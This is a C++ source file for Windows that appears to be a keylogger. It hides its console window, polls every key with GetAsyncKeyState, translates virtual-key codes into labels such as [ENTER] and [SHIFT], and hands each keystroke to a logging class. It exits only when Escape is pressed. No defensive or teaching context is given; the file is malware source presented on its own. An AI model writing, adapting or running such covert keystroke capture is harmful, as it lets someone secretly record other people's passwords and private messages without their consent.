#include <Windows.h>
#include "LogManager.h"
#include <iostream>
#define KEY_PRESSED -32767

using namespace std;

string translateKey(char c);

int main()
{
    FreeConsole(); 

    LogManager* logs = new LogManager();
    char possible_key;

    logs->init("");

    for (possible_key = 8; possible_key < 128; possible_key++) {
        if (GetAsyncKeyState(possible_key) == KEY_PRESSED) {
            if (translateKey((char) possible_key) == "[ESCAPE]") {
                delete logs;
                return EXIT_SUCCESS;
                }
            logs->save(translateKey((char) possible_key));
        }
    }        
}


string translateKey(char c) {
    switch (c) {
    case VK_BACK: return "[BACK]";
    case VK_TAB: return "[TAB]";
    case VK_CLEAR: return "[CLEAR]";
    case VK_RETURN: return "[ENTER]";
    case VK_SHIFT: return "[SHIFT]";
    case VK_CONTROL: return "[CONTROL]";
    case VK_MENU: return "[ALT]";
    case VK_PAUSE: return "[PAUSE]";
    case VK_CAPITAL: return "[CAPS_LOCK]";
    case VK_ESCAPE: return "[ESCAPE]";
    case VK_SPACE: return "[SPACE]";
    case VK_PRIOR: return "[PRIOR (UP)]";
    case VK_NEXT: return "[NEXT]";
    case VK_END: return "[END]";
    case VK_HOME: return "[HOME]";
    case VK_LEFT: return "[ARROW_LEFT]";
    case VK_UP: return "[ARROW_UP]";
    case VK_RIGHT: return "[ARROW_RIGHT]";
    case VK_DOWN: return "[ARROW_DOWN]";
    case VK_INSERT: return "[INSERT]";
    case VK_DELETE: return "[DELETE]";
    default:
        std::string s(1, c);
        return s;
    }
}